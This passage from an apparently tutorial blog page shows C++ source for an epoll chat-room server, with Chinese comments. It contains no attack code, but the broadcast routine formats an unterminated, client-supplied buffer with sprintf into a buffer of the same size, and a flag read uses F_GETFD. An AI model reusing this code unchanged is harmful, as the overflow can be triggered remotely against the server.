class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span>  CHATROOM_COMMON_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CHATROOM_COMMON_H</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;list&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/epoll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// &#x9ED8;&#x8BA4;&#x670D;&#x52A1;&#x5668;&#x7AEF;IP&#x5730;&#x5740;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SERVER_IP <span class="meta-string">&quot;127.0.0.1&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// &#x670D;&#x52A1;&#x5668;&#x7AEF;&#x53E3;&#x53F7;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SERVER_PORT 8888</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// int epoll_create(int size)&#x4E2D;&#x7684;size</span></span><br><span class="line"><span class="comment">// &#x4E3A;epoll&#x652F;&#x6301;&#x7684;&#x6700;&#x5927;&#x53E5;&#x67C4;&#x6570;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EPOLL_SIZE 5000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// &#x7F13;&#x51B2;&#x533A;&#x5927;&#x5C0F;65535</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUF_SIZE 0xFFFF</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">// &#x65B0;&#x7528;&#x6237;&#x767B;&#x5F55;&#x540E;&#x7684;&#x6B22;&#x8FCE;&#x4FE1;&#x606F;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SERVER_WELCOME <span class="meta-string">&quot;Welcome you join to the chat room! Your chat ID is: Client #%d&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// &#x5176;&#x4ED6;&#x7528;&#x6237;&#x6536;&#x5230;&#x6D88;&#x606F;&#x7684;&#x524D;&#x7F00;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SERVER_MESSAGE <span class="meta-string">&quot;ClientID %d say &gt;&gt; %s&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// &#x9000;&#x51FA;&#x7CFB;&#x7EDF;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EXIT <span class="meta-string">&quot;EXIT&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// &#x63D0;&#x9192;&#x4F60;&#x662F;&#x804A;&#x5929;&#x5BA4;&#x4E2D;&#x552F;&#x4E00;&#x7684;&#x5BA2;&#x6237;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CAUTION <span class="meta-string">&quot;There is only one int the char room!&quot;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// &#x6CE8;&#x518C;&#x65B0;&#x7684;fd&#x5230;epollfd&#x4E2D;</span></span><br><span class="line"><span class="comment">// &#x53C2;&#x6570;enable_et&#x8868;&#x793A;&#x662F;&#x5426;&#x542F;&#x7528;ET&#x6A21;&#x5F0F;&#xFF0C;&#x5982;&#x679C;&#x4E3A;True&#x5219;&#x542F;&#x7528;&#xFF0C;&#x5426;&#x5219;&#x4F7F;&#x7528;LT&#x6A21;&#x5F0F;</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">addfd</span><span class="params">( <span class="keyword">int</span> epollfd, <span class="keyword">int</span> fd, <span class="keyword">bool</span> enable_et )</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">epoll_event</span> <span class="title">ev</span>;</span></span><br><span class="line">    ev.data.fd = fd;</span><br><span class="line">    ev.events = EPOLLIN;</span><br><span class="line">    <span class="keyword">if</span>( enable_et )</span><br><span class="line">        ev.events = EPOLLIN | EPOLLET;</span><br><span class="line">    epoll_ctl(epollfd, EPOLL_CTL_ADD, fd, &amp;ev);</span><br><span class="line">    <span class="comment">// &#x8BBE;&#x7F6E;socket&#x4E3A;nonblocking&#x6A21;&#x5F0F;</span></span><br><span class="line">    <span class="comment">// &#x6267;&#x884C;&#x5B8C;&#x5C31;&#x8F6C;&#x5411;&#x4E0B;&#x4E00;&#x6761;&#x6307;&#x4EE4;&#xFF0C;&#x4E0D;&#x7BA1;&#x51FD;&#x6570;&#x6709;&#x6CA1;&#x6709;&#x8FD4;&#x56DE;&#x3002;</span></span><br><span class="line">    fcntl(fd, F_SETFL, fcntl(fd, F_GETFD, <span class="number">0</span>)| O_NONBLOCK);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fd added to epoll!\n\n&quot;</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">// CHATROOM_COMMON_H</span></span></span><br></pre></td></tr></tbody></table></figure><p></p><p>server.cpp:<br></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;Server.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// &#x670D;&#x52A1;&#x7AEF;&#x7C7B;&#x6210;&#x5458;&#x51FD;&#x6570;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// &#x670D;&#x52A1;&#x7AEF;&#x7C7B;&#x6784;&#x9020;&#x51FD;&#x6570;</span></span><br><span class="line">Server::Server(){</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// &#x521D;&#x59CB;&#x5316;&#x670D;&#x52A1;&#x5668;&#x5730;&#x5740;&#x548C;&#x7AEF;&#x53E3;</span></span><br><span class="line">    serverAddr.sin_family = PF_INET;</span><br><span class="line">    serverAddr.sin_port = htons(SERVER_PORT);</span><br><span class="line">    serverAddr.sin_addr.s_addr = inet_addr(SERVER_IP);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// &#x521D;&#x59CB;&#x5316;socket</span></span><br><span class="line">    listener = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// epool fd</span></span><br><span class="line">    epfd = <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// &#x521D;&#x59CB;&#x5316;&#x670D;&#x52A1;&#x7AEF;&#x5E76;&#x542F;&#x52A8;&#x76D1;&#x542C;</span></span><br><span class="line"><span class="keyword">void</span> Server::Init() {</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Init Server...&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    </span><br><span class="line">     <span class="comment">//&#x521B;&#x5EFA;&#x76D1;&#x542C;socket</span></span><br><span class="line">    listener = socket(PF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(listener &lt; <span class="number">0</span>) { perror(<span class="string">&quot;listener&quot;</span>); <span class="built_in">exit</span>(<span class="number">-1</span>);}</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//&#x7ED1;&#x5B9A;&#x5730;&#x5740;</span></span><br><span class="line">    <span class="keyword">if</span>( bind(listener, (struct sockaddr *)&amp;serverAddr, <span class="keyword">sizeof</span>(serverAddr)) &lt; <span class="number">0</span>) {</span><br><span class="line">        perror(<span class="string">&quot;bind error&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">//&#x76D1;&#x542C;</span></span><br><span class="line">    <span class="keyword">int</span> ret = listen(listener, <span class="number">5</span>);</span><br><span class="line">    <span class="keyword">if</span>(ret &lt; <span class="number">0</span>) {</span><br><span class="line">        perror(<span class="string">&quot;listen error&quot;</span>); </span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Start to listen: &quot;</span> &lt;&lt; SERVER_IP &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//&#x5728;&#x5185;&#x6838;&#x4E2D;&#x521B;&#x5EFA;&#x4E8B;&#x4EF6;&#x8868;</span></span><br><span class="line">    epfd = epoll_create(EPOLL_SIZE);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(epfd &lt; <span class="number">0</span>) {</span><br><span class="line">        perror(<span class="string">&quot;epfd error&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">//&#x5F80;&#x4E8B;&#x4EF6;&#x8868;&#x91CC;&#x6DFB;&#x52A0;&#x76D1;&#x542C;&#x4E8B;&#x4EF6;</span></span><br><span class="line">    addfd(epfd, listener, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// &#x5173;&#x95ED;&#x670D;&#x52A1;&#xFF0C;&#x6E05;&#x7406;&#x5E76;&#x5173;&#x95ED;&#x6587;&#x4EF6;&#x63CF;&#x8FF0;&#x7B26;</span></span><br><span class="line"><span class="keyword">void</span> Server::Close() {</span><br><span class="line"></span><br><span class="line">    <span class="comment">//&#x5173;&#x95ED;socket</span></span><br><span class="line">    close(listener);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//&#x5173;&#x95ED;epoll&#x76D1;&#x542C;</span></span><br><span class="line">    close(epfd);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// &#x53D1;&#x9001;&#x5E7F;&#x64AD;&#x6D88;&#x606F;&#x7ED9;&#x6240;&#x6709;&#x5BA2;&#x6237;&#x7AEF;</span></span><br><span class="line"><span class="keyword">int</span> Server::SendBroadcastMessage(<span class="keyword">int</span> clientfd)</span><br><span class="line">{</span><br><span class="line">    <span class="comment">// buf[BUF_SIZE] &#x63A5;&#x6536;&#x65B0;&#x6D88;&#x606F;</span></span><br><span class="line">    <span class="comment">// message[BUF_SIZE] &#x4FDD;&#x5B58;&#x683C;&#x5F0F;&#x5316;&#x7684;&#x6D88;&#x606F;</span></span><br><span class="line">    <span class="keyword">char</span> buf[BUF_SIZE], message[BUF_SIZE];</span><br><span class="line">    bzero(buf, BUF_SIZE);</span><br><span class="line">    bzero(message, BUF_SIZE);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// &#x63A5;&#x6536;&#x65B0;&#x6D88;&#x606F;</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;read from client(clientID = &quot;</span> &lt;&lt; clientfd &lt;&lt; <span class="string">&quot;)&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">int</span> len = recv(clientfd, buf, BUF_SIZE, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// &#x5982;&#x679C;&#x5BA2;&#x6237;&#x7AEF;&#x5173;&#x95ED;&#x4E86;&#x8FDE;&#x63A5;</span></span><br><span class="line">    <span class="keyword">if</span>(len == <span class="number">0</span>) </span><br><span class="line">    {</span><br><span class="line">        close(clientfd);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// &#x5728;&#x5BA2;&#x6237;&#x7AEF;&#x5217;&#x8868;&#x4E2D;&#x5220;&#x9664;&#x8BE5;&#x5BA2;&#x6237;&#x7AEF;</span></span><br><span class="line">        clients_list.remove(clientfd);</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;ClientID = &quot;</span> &lt;&lt; clientfd </span><br><span class="line">             &lt;&lt; <span class="string">&quot; closed.\n now there are &quot;</span> </span><br><span class="line">             &lt;&lt; clients_list.size()</span><br><span class="line">             &lt;&lt; <span class="string">&quot; client in the char room&quot;</span></span><br><span class="line">             &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">    <span class="comment">// &#x53D1;&#x9001;&#x5E7F;&#x64AD;&#x6D88;&#x606F;&#x7ED9;&#x6240;&#x6709;&#x5BA2;&#x6237;&#x7AEF;</span></span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">    {</span><br><span class="line">        <span class="comment">// &#x5224;&#x65AD;&#x662F;&#x5426;&#x804A;&#x5929;&#x5BA4;&#x8FD8;&#x6709;&#x5176;&#x4ED6;&#x5BA2;&#x6237;&#x7AEF;</span></span><br><span class="line">        <span class="keyword">if</span>(clients_list.size() == <span class="number">1</span>) { </span><br><span class="line">            <span class="comment">// &#x53D1;&#x9001;&#x63D0;&#x793A;&#x6D88;&#x606F;</span></span><br><span class="line">            send(clientfd, CAUTION, <span class="built_in">strlen</span>(CAUTION), <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">return</span> len;</span><br><span class="line">        }</span><br><span class="line">        <span class="comment">// &#x683C;&#x5F0F;&#x5316;&#x53D1;&#x9001;&#x7684;&#x6D88;&#x606F;&#x5185;&#x5BB9;</span></span><br><span class="line">        <span class="built_in">sprintf</span>(message, SERVER_MESSAGE, clientfd, buf);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// &#x904D;&#x5386;&#x5BA2;&#x6237;&#x7AEF;&#x5217;&#x8868;&#x4F9D;&#x6B21;&#x53D1;&#x9001;&#x6D88;&#x606F;&#xFF0C;&#x9700;&#x8981;&#x5224;&#x65AD;&#x4E0D;&#x8981;&#x7ED9;&#x6765;&#x6E90;&#x5BA2;&#x6237;&#x7AEF;&#x53D1;</span></span><br><span class="line">        <span class="built_in">list</span>&lt;<span class="keyword">int</span>&gt;::iterator it;</span><br><span class="line">        <span class="keyword">for</span>(it = clients_list.begin(); it != clients_list.end(); ++it) {</span><br><span class="line">           <span class="keyword">if</span>(*it != clientfd){</span><br><span class="line">                <span class="keyword">if</span>( send(*it, message, BUF_SIZE, <span class="number">0</span>) &lt; <span class="number">0</span> ) {</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">                }</span><br><span class="line">           }</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> len;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// &#x542F;&#x52A8;&#x670D;&#x52A1;&#x7AEF;</span></span><br><span class="line"><span class="keyword">void</span> Server::Start() {</span><br><span class="line"></span><br><span class="line">    <span class="comment">// epoll &#x4E8B;&#x4EF6;&#x961F;&#x5217;</span></span><br><span class="line">    <span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">epoll_event</span> <span class="title">events</span>[<span class="title">EPOLL_SIZE</span>];</span> </span><br><span class="line"></span><br><span class="line">    <span class="comment">// &#x521D;&#x59CB;&#x5316;&#x670D;&#x52A1;&#x7AEF;</span></span><br><span class="line">    Init();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//&#x4E3B;&#x5FAA;&#x73AF;</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="comment">//epoll_events_count&#x8868;&#x793A;&#x5C31;&#x7EEA;&#x4E8B;&#x4EF6;&#x7684;&#x6570;&#x76EE;</span></span><br><span class="line">        <span class="keyword">int</span> epoll_events_count = epoll_wait(epfd, events, EPOLL_SIZE, <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(epoll_events_count &lt; <span class="number">0</span>) {</span><br><span class="line">            perror(<span class="string">&quot;epoll failure&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;epoll_events_count =\n&quot;</span> &lt;&lt; epoll_events_count &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//&#x5904;&#x7406;&#x8FD9;epoll_events_count&#x4E2A;&#x5C31;&#x7EEA;&#x4E8B;&#x4EF6;</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; epoll_events_count; ++i)</span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">int</span> sockfd = events[i].data.fd;</span><br><span class="line">            <span class="comment">//&#x65B0;&#x7528;&#x6237;&#x8FDE;&#x63A5;</span></span><br><span class="line">            <span class="keyword">if</span>(sockfd == listener)</span><br><span class="line">            {</span><br><span class="line">                <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">client_address</span>;</span></span><br><span class="line">                <span class="keyword">socklen_t</span> client_addrLength = <span class="keyword">sizeof</span>(struct sockaddr_in);</span><br><span class="line">                <span class="keyword">int</span> clientfd = accept( listener, ( struct sockaddr* )&amp;client_address, &amp;client_addrLength );</span><br><span class="line"></span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;client connection from: &quot;</span></span><br><span class="line">                     &lt;&lt; inet_ntoa(client_address.sin_addr) &lt;&lt; <span class="string">&quot;:&quot;</span></span><br><span class="line">                     &lt;&lt; ntohs(client_address.sin_port) &lt;&lt; <span class="string">&quot;, clientfd = &quot;</span></span><br><span class="line">                     &lt;&lt; clientfd &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">                addfd(epfd, clientfd, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// &#x670D;&#x52A1;&#x7AEF;&#x7528;list&#x4FDD;&#x5B58;&#x7528;&#x6237;&#x8FDE;&#x63A5;</span></span><br><span class="line">                clients_list.push_back(clientfd);</span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Add new clientfd = &quot;</span> &lt;&lt; clientfd &lt;&lt; <span class="string">&quot; to epoll&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Now there are &quot;</span> &lt;&lt; clients_list.size() &lt;&lt; <span class="string">&quot; clients int the chat room&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// &#x670D;&#x52A1;&#x7AEF;&#x53D1;&#x9001;&#x6B22;&#x8FCE;&#x4FE1;&#x606F;  </span></span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;welcome message&quot;</span> &lt;&lt; <span class="built_in">endl</span>;                </span><br><span class="line">                <span class="keyword">char</span> message[BUF_SIZE];</span><br><span class="line">                bzero(message, BUF_SIZE);</span><br><span class="line">                <span class="built_in">sprintf</span>(message, SERVER_WELCOME, clientfd);</span><br><span class="line">                <span class="keyword">int</span> ret = send(clientfd, message, BUF_SIZE, <span class="number">0</span>);</span><br><span class="line">                <span class="keyword">if</span>(ret &lt; <span class="number">0</span>) {</span><br><span class="line">                    perror(<span class="string">&quot;send error&quot;</span>);</span><br><span class="line">                    Close();</span><br><span class="line">                    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">                }</span><br><span class="line">            }</span><br><span class="line">            <span class="comment">//&#x5904;&#x7406;&#x7528;&#x6237;&#x53D1;&#x6765;&#x7684;&#x6D88;&#x606F;&#xFF0C;&#x5E76;&#x5E7F;&#x64AD;&#xFF0C;&#x4F7F;&#x5176;&#x4ED6;&#x7528;&#x6237;&#x6536;&#x5230;&#x4FE1;&#x606F;</span></span><br><span class="line">            <span class="keyword">else</span> {   </span><br><span class="line">                <span class="keyword">int</span> ret = SendBroadcastMessage(sockfd);</span><br><span class="line">                <span class="keyword">if</span>(ret &lt; <span class="number">0</span>) {</span><br><span class="line">                    perror(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">                    Close();</span><br><span class="line">                    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">                }</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">// &#x5173;&#x95ED;&#x670D;&#x52A1;</span></span><br><span class="line">    Close();</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>server.h<br></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> CHATROOM_SERVER_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CHATROOM_SERVER_H</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;Common.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// &#x670D;&#x52A1;&#x7AEF;&#x7C7B;&#xFF0C;&#x7528;&#x6765;&#x5904;&#x7406;&#x5BA2;&#x6237;&#x7AEF;&#x8BF7;&#x6C42;</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Server</span> {</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// &#x65E0;&#x53C2;&#x6570;&#x6784;&#x9020;&#x51FD;&#x6570;</span></span><br><span class="line">    Server();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// &#x521D;&#x59CB;&#x5316;&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x8BBE;&#x7F6E;</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Init</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// &#x5173;&#x95ED;&#x670D;&#x52A1;</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Close</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// &#x542F;&#x52A8;&#x670D;&#x52A1;&#x7AEF;</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Start</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="comment">// &#x5E7F;&#x64AD;&#x6D88;&#x606F;&#x7ED9;&#x6240;&#x6709;&#x5BA2;&#x6237;&#x7AEF;</span></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">SendBroadcastMessage</span><span class="params">(<span class="keyword">int</span> clientfd)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// &#x670D;&#x52A1;&#x5668;&#x7AEF;serverAddr&#x4FE1;&#x606F;</span></span><br><span class="line">    <span 